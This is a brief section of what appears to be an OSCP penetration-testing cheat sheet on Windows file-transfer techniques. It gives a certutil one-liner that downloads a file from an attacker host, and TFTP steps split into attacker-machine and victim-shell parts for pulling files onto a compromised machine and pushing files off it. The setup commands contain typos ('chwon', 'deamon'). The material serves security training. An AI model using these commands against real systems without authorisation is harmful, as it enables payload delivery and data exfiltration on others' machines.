

## CertUtil

```powershell
certutil.exe -urlcache -split -f "http://$IP/$FILE"

```

**TFTP** (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.) [ref](https://github.com/pythonmaster41/Go-For-OSCP)
```powershell
# On attacker machine:

mkdir /tftp
chwon nobody: /tftp
atftpd --deamon --port 69 tftp
cp $FILE tftp
# On victim machine shell:
tftp -i $IP GET $FILE
tftp -i $IP PUT $FILE
```


[pythonmaster41](https://github.com/pythonmaster41/Go-For-OSCP)
[hackersinterview](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)